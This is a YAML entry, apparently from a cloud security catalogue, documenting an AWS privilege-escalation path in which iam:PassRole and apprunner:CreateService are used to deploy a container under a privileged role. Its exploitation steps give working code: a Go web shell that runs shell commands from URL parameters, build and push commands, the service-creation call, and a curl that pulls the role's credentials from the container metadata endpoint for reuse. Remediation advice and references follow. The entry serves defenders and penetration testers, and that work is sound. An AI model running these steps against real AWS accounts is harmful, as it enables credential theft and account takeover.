id: apprunner-001
name: iam:PassRole + apprunner:CreateService
category: service-passrole
services:
- iam
- apprunner
description: A principal with `iam:PassRole` and `apprunner:CreateService` can create an AWS App Runner service with a privileged
  IAM role. By deploying a malicious container image (such as a web shell or reverse shell) as the App Runner service, the
  attacker can execute arbitrary code within the container. The container has access to the IAM role's credentials via the
  AWS SDK or instance metadata service, allowing the attacker to perform actions with the role's elevated permissions. This
  technique provides direct privilege escalation to any IAM role that can be attached to App Runner services.
prerequisites:
  admin:
  - A role must exist that trusts apprunner.amazonaws.com to assume it
  - The role must have administrative permissions (e.g., AdministratorAccess or an equivalent custom policy)
  - Access to a container registry (ECR or public registry) to host the malicious image
  lateral:
  - A role must exist that trusts apprunner.amazonaws.com to assume it
  - Access to a container registry (ECR or public registry) to host the malicious image
exploitationSteps:
  awscli:
  - step: 1
    command: |
      cat > main.go << 'EOF'
      package main
      import (
          "net/http"
          "os/exec"
      )
      func handler(w http.ResponseWriter, r *http.Request) {
          cmd := r.URL.Query().Get("cmd")
          out, _ := exec.Command("sh", "-c", cmd).CombinedOutput()
          w.Write(out)
      }
      func main() {
          http.HandleFunc("/", handler)
          http.ListenAndServe(":8080", nil)
      }
      EOF
    description: Create a simple web shell that executes commands via URL parameters
  - step: 2
    command: |
      cat > Dockerfile << 'EOF'
      FROM golang:1.19
      WORKDIR /app
      COPY main.go .
      RUN go build -o webshell main.go
      EXPOSE 8080
      CMD ["./webshell"]
      EOF
    description: Create a Dockerfile for the web shell
  - step: 3
    command: |
      docker build -t malicious-apprunner .
      docker tag malicious-apprunner:latest PUBLIC_ECR_URI:latest
      docker push PUBLIC_ECR_URI:latest
    description: Build and push the malicious container image to a registry
  - step: 4
    command: |
      aws apprunner create-service \
        --service-name privesc-service \
        --source-configuration '{
          "ImageRepository": {
            "ImageIdentifier": "PUBLIC_ECR_URI:latest",
            "ImageRepositoryType": "ECR_PUBLIC",
            "ImageConfiguration": {
              "Port": "8080"
            }
          },
          "AutoDeploymentsEnabled": false
        }' \
        --instance-configuration '{
          "InstanceRoleArn": "arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE"
        }'
    description: Create an App Runner service with the malicious image and privileged role
  - step: 5
    command: aws apprunner describe-service --service-arn SERVICE_ARN
    description: Wait for the service to be in 'RUNNING' status and retrieve the service URL
  - step: 6
    command: |
      curl "https://SERVICE_URL/?cmd=curl%20169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"
    description: Use the web shell to retrieve temporary credentials from the container metadata
  - step: 7
    command: |
      export AWS_ACCESS_KEY_ID=<from step 6>
      export AWS_SECRET_ACCESS_KEY=<from step 6>
      export AWS_SESSION_TOKEN=<from step 6>
      aws sts get-caller-identity
    description: Use the stolen credentials to assume the privileged role's permissions
recommendation: |
  Restrict the `iam:PassRole` permission using the principle of least privilege.

  ```json
  {
    "Effect": "Allow",
    "Action": "iam:PassRole",
    "Resource": "arn:aws:iam::ACCOUNT_ID:role/SpecificAppRunnerRole",
    "Condition": {
      "StringEquals": {
        "iam:PassedToService": "apprunner.amazonaws.com"
      }
    }
  }
  ```

  Additional controls:
  - Restrict `apprunner:CreateService` permissions to specific users/roles
  - Monitor CloudTrail for App Runner service creation with privileged roles
  - Use VPC configuration to isolate App Runner services
  - Implement container image scanning and signing
  - Only allow images from trusted ECR repositories
  - Alert on App Runner services created with administrative roles
  - Use AWS Config to detect services with overly permissive roles
discoveredBy:
  name: Riyaz Walikar
  organization: Appsecco
  date: '2021'
references:
- title: Getting Shell and Data Access in AWS App Runner
  url: https://blog.appsecco.com/getting-shell-and-data-access-in-aws-app-runner-3632e844bc77
- title: HackTricks Cloud - AWS App Runner Privilege Escalation
  url: https://cloud.hacktricks.wiki/pentesting-cloud/aws-security/aws-privilege-escalation/aws-apprunner-privesc
relatedPaths:
- apprunner-002
- lambda-001
- ec2-001
toolSupport:
  pmapper: false
  iamVulnerable: false
attackVisualization:
  nodes:
    - id: start
      label: starting-principal
      type: principal
      description: |
        The principal with iam:PassRole and apprunner:CreateService permissions. Can be an IAM user or role.

    - id: apprunner_service
      label: App Runner Service
      type: resource
      description: |
        New App Runner service created with a malicious container image and a privileged IAM role. The service runs on AWS-managed infrastructure and automatically assumes the attached role. The container image contains a web shell that allows command execution with the target role's credentials.

    - id: target_role
      label: target-role
      type: resource
      description: |
        IAM role passed to the App Runner service as the instance role. The role must trust apprunner.amazonaws.com to assume it. Credentials are available via the AWS Container Credentials Relative URI environment variable within the running container.

    - id: exfiltrate_creds
      label: Exfiltrate Credentials
      type: action
      color: '#99ccff'
      description: |
        Use the web shell endpoint to execute commands within the running container. The container has access to the target role's temporary credentials via the AWS_CONTAINER_CREDENTIALS_RELATIVE_URI environment variable, which points to the container metadata service at 169.254.170.2. The web shell can query this endpoint to retrieve the AccessKeyId, SecretAccessKey, and SessionToken.

        Example commands the web shell could execute:
        - Query metadata service for credentials
        - Use AWS SDK with the role's credentials to perform privileged actions
        - Exfiltrate credentials to attacker-controlled infrastructure

    - id: admin
      label: Effective Administrator
      type: outcome
      description: |
        The attacker successfully exfiltrated credentials from the App Runner service and the target role has AdministratorAccess or equivalent permissions. The attacker now has full administrative access to the AWS account.

    - id: some_perms
      label: Check for Additional Access
      type: outcome
      color: '#ffeb99'
      description: |
        The attacker successfully exfiltrated credentials from the App Runner service and the target role has some elevated permissions (but not full admin). This could provide data access (S3, RDS, DynamoDB) or enable additional privilege escalation paths.

    - id: no_access
      label: Minimal Additional Access
      type: outcome
      color: '#cccccc'
      description: |
        The attacker successfully exfiltrated credentials from the App Runner service, but the target role only has minimal permissions. Limited usefulness for privilege escalation.

  edges:
    - from: start
      to: apprunner_service
      label: iam:PassRole + apprunner:CreateService
      description: |
        Create a new App Runner service with a malicious container image (containing a web shell) and pass the target role to it as the instance role. The container image must be accessible from a container registry (ECR or public registry).

        Command:
        ```bash
        aws apprunner create-service \
          --service-name privesc-service \
          --source-configuration '{
            "ImageRepository": {
              "ImageIdentifier": "PUBLIC_ECR_URI:latest",
              "ImageRepositoryType": "ECR_PUBLIC",
              "ImageConfiguration": {
                "Port": "8080"
              }
            },
            "AutoDeploymentsEnabled": false
          }' \
          --instance-configuration '{
            "InstanceRoleArn": "arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE"
          }'
        ```

        Wait for the service to reach RUNNING status and retrieve the service URL.

    - from: apprunner_service
      to: target_role
      label: Service assumes role
      description: |
        The App Runner service automatically assumes the passed instance role. Credentials become available within the running container via the AWS_CONTAINER_CREDENTIALS_RELATIVE_URI environment variable, which points to 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI.

    - from: target_role
      to: exfiltrate_creds
      label: Access web shell
      description: |
        Access the deployed web shell via the App Runner service URL to execute commands within the container. The web shell can query the container metadata service to retrieve the target role's temporary credentials.

        Command:
        ```bash
        curl "https://SERVICE_URL/?cmd=curl%20169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"
        ```

        This returns a JSON response containing AccessKeyId, SecretAccessKey, and Token that can be used to authenticate as the target role.

    - from: exfiltrate_creds
      to: admin
      label: If target role has admin permissions
      branch: A
      condition: admin
      description: |
        If the target role has AdministratorAccess or equivalent permissions, the attacker gains full administrative access by using the exfiltrated credentials.

    - from: exfiltrate_creds
      to: some_perms
      label: If target role has some elevated permissions
      branch: B
      condition: some_permissions
      description: |
        If the target role has some elevated permissions (data access, further escalation paths), the attacker can leverage the exfiltrated credentials for lateral movement or additional attacks.

    - from: exfiltrate_creds
      to: no_access
      label: If target role has minimal permissions
      branch: C
      condition: no_permissions
      description: |
        If the target role only has minimal permissions (like logs:PutLogEvents), the exfiltrated credentials provide limited value for privilege escalation.
permissions:
  required:
  - permission: iam:PassRole
    resourceConstraints: Target role ARN must be in the Resource section
  - permission: apprunner:CreateService
    resourceConstraints: Must have permission to create App Runner services
  additional:
  - permission: iam:ListRoles
    resourceConstraints: Helpful for discovering available roles to pass
  - permission: iam:GetRole
    resourceConstraints: Useful for viewing role trust policies and attached permissions
